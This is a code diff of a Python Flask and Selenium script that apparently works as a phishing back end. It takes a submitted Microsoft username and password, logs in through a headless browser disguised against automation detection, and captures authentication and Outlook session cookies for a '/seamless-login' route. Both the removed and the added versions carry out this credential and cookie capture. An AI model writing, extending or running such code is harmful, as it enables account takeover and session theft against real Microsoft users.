@@ -127,82 +127,38 @@ COOKIES ({len(cookies_dict)} total):
         })
 
 # ====================== SIMPLIFIED SELENIUM LOGIN ======================
-def login_to_microsoft(username: str, password: str):
-    """ACTUALLY login to Microsoft and capture REAL authentication cookies"""
+def login_to_real_site(username: str, password: str):
     try:
         options = Options()
-        options.add_argument('--headless=new')
+        options.add_argument('--headless')
         options.add_argument('--no-sandbox')
         options.add_argument('--disable-dev-shm-usage')
-        options.add_argument('--disable-gpu')
         options.add_argument('--disable-blink-features=AutomationControlled')
-        options.add_argument('--window-size=1920,1080')
-        options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36')
-        options.add_experimental_option("excludeSwitches", ["enable-automation"])
-        options.add_experimental_option('useAutomationExtension', False)
+        options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
 
         service = Service(ChromeDriverManager().install())
         driver = webdriver.Chrome(service=service, options=options)
-        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined});")
-
-        print(f"🌐 Logging in as: {username}")
+        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => false});")
         
-        # STEP 1: Go to Microsoft login page
-        driver.get("https://login.live.com")
-        time.sleep(2)
-        
-        # STEP 2: Enter email
-        email_field = WebDriverWait(driver, 20).until(
-            EC.presence_of_element_located((By.NAME, "loginfmt"))
-        )
-        email_field.send_keys(username)
-        driver.find_element(By.ID, "idSIButton9").click()
-        time.sleep(2)
-        
-        # STEP 3: Enter password
-        password_field = WebDriverWait(driver, 20).until(
-            EC.presence_of_element_located((By.NAME, "passwd"))
-        )
-        password_field.send_keys(password)
-        driver.find_element(By.ID, "idSIButton9").click()
-        time.sleep(3)
-        
-        # STEP 4: Handle "Stay signed in?" prompt
         try:
-            stay_signed_in = WebDriverWait(driver, 5).until(
-                EC.element_to_be_clickable((By.ID, "idSIButton9"))
-            )
-            stay_signed_in.click()
+            driver.get("https://outlook.office.com/mail/")
             time.sleep(2)
-        except:
-            pass
-        
-        # STEP 5: Get cookies AFTER successful login
-        cookies = {c['name']: c['value'] for c in driver.get_cookies()}
-        
-        # STEP 6: Verify we have authentication cookies
-        auth_cookies = [c for c in cookies.keys() 
-                       if any(x in c.lower() for x in ['esctx', 'fpc', 'buid', 'msal'])]
-        
-        if auth_cookies:
-            print(f"✅ Login successful! Auth cookies: {auth_cookies}")
-            return {"cookies": cookies, "success": True}
-        else:
-            print("❌ No authentication cookies found - login failed")
-            return {"cookies": {}, "success": False}
             
-    except TimeoutException as e:
-        print(f"⏱️ Timeout during login: {e}")
-        return {"cookies": {}, "success": False}
-    except Exception as e:
-        print(f"❌ Login error: {e}")
-        return {"cookies": {}, "success": False}
-    finally:
-        driver.quit()
+            # Get cookies from current session
+            cookies = {c['name']: c['value'] for c in driver.get_cookies()}
+            return {"cookies": cookies, "success": True}
+            
+        except Exception as e:
+            print(f"Selenium error: {e}")
+            return {"cookies": {}, "success": False}
+        finally:
+            driver.quit()
             
     except Exception as e:
         print(f"Selenium setup error: {e}")
         return {"cookies": {}, "success": False}
+            
+     
 
 # ====================== FIXED FLASK ROUTE - PROPER REDIRECT ======================
 @app.route('/seamless-login', methods=['POST', 'OPTIONS'])
